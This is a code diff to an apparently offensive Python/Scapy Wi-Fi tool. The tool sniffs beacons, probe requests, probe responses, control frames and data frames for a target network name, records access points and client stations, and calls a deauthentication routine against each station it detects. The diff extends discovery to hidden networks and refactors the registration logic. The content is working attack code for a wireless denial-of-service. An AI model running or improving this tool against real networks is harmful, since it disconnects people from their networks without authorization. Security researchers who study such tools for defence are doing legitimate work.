@@ -9,7 +9,6 @@
 #
 # add ap whitelist argument
 # add module docstring
-# add support for hidden networks
 # check for protected management frames
 
 import sys
@@ -18,6 +17,8 @@ from scapy import sendrecv
 from scapy.layers import dot11
 
 BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
+BPF_DOT11_PROBE_REQ = 'wlan type mgt subtype probe-req'
+BPF_DOT11_PROBE_RESP = 'wlan type mgt subtype probe-resp'
 BPF_DOT11_CONTROL =  'wlan type ctl'
 BPF_DOT11_DATA = 'wlan type data'
 DEAUTH_COUNT = 64
@@ -72,6 +73,32 @@ def get_src_dst_network(frame):
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
+def register_ap(wifi_essid, bssid_ap, bssid_network, bssids_aps_dict):
+    '''ap registration'''
+    
+    try:
+        bssids_aps_dict.update({bssid_ap: bssid_network})
+        print_info(
+            f'AP detected for network {wifi_essid}'
+            f'\n    access point = {bssid_ap}'
+            f'\n    network      = {bssid_network}'
+        )
+    except Exception as e:
+        raise MsgException(e, 'Detected access point could not be registered')
+
+def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
+    '''sta registration'''
+    
+    try:
+        bssids_stas_dict.update({bssid_sta: bssid_ap})
+        print_info(
+            f'STA detected for network {wifi_essid}'
+            f'\n    station      = {bssid_sta}'
+            f'\n    access point = {bssid_ap}'
+        )
+    except Exception as e:
+        raise MsgException(e, 'Detected station could not be registered')
+
 def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
     
@@ -109,32 +136,38 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dic
                         while dot11_element:
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
-                                    bssids_aps_dict.update({bssid_src: bssid_network})
-                                    print_info(
-                                        f'AP detected for network {wifi_essid}'
-                                        f'\n    network      = {bssid_network}'
-                                        f'\n    access point = {bssid_src}'
-                                    )
+                                    register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
+                                break
+                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
+                
+                elif frame.haslayer(dot11.Dot11ProbeReq): # wlan type mgt subtype probe-req
+                    if is_unicast(bssid_dst) and (not bssids_aps_dict.get(bssid_dst)):
+                        dot11_element = frame.getlayer(dot11.Dot11Elt)
+                        while dot11_element:
+                            if dot11_element.ID == 0:
+                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
+                                    register_ap(wifi_essid, bssid_dst, bssid_network, bssids_aps_dict)
+                                break
+                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
+                
+                elif frame.haslayer(dot11.Dot11ProbeResp): # wlan type mgt subtype probe-resp
+                    if not bssids_aps_dict.get(bssid_src):
+                        dot11_element = frame.getlayer(dot11.Dot11Elt)
+                        while dot11_element:
+                            if dot11_element.ID == 0:
+                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
+                                    register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
                 else: # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
-                        bssids_stas_dict.update({bssid_dst: bssid_src})
-                        print_info(
-                            f'STA detected for network {wifi_essid}'
-                            f'\n    station      = {bssid_dst}'
-                            f'\n    access point = {bssid_src}'
-                        )
+                        register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
                         unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
-                        bssids_stas_dict.update({bssid_src: bssid_dst})
-                        print_info(
-                            f'STA detected for network {wifi_essid}'
-                            f'\n    station      = {bssid_src}'
-                            f'\n    access point = {bssid_dst}'
-                        )
+                        register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
                         unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
+        
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
@@ -161,7 +194,12 @@ def main():
         bssids_stas_dict = {} # {sta bssid: ap bssid}
         sendrecv.sniff(
             iface = args.wifi_interface,
-            filter = BPF_DOT11_BEACON + ' or ' + BPF_DOT11_CONTROL + ' or ' + BPF_DOT11_DATA,
+            filter =
+                BPF_DOT11_BEACON + ' or ' +
+                BPF_DOT11_PROBE_REQ + ' or ' +
+                BPF_DOT11_PROBE_RESP + ' or ' +
+                BPF_DOT11_CONTROL + ' or ' +
+                BPF_DOT11_DATA,
             prn = sniffer_wrapper(args.wifi_interface, args.wifi_essid, bssids_aps_dict, bssids_stas_dict),
         )
     except MsgException as msg_exception:
